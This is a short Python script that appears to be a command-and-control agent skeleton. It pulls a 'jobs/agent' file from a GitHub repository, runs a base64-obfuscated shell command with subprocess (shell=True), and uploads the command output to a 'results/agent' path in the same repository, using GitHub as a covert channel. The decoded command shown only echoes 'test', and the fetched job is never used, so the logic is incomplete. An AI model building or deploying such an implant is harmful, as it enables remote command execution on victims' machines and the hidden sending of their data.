import requests, subprocess, base64
mail = requests.get('https://api.github.com/repos/example/ops/contents/jobs/agent')
command = base64.b64decode('ZWNobyB0ZXN0').decode()
output = subprocess.check_output(command, shell=True)
requests.put('https://api.github.com/repos/example/ops/contents/results/agent', json={'content': base64.b64encode(output).decode()})
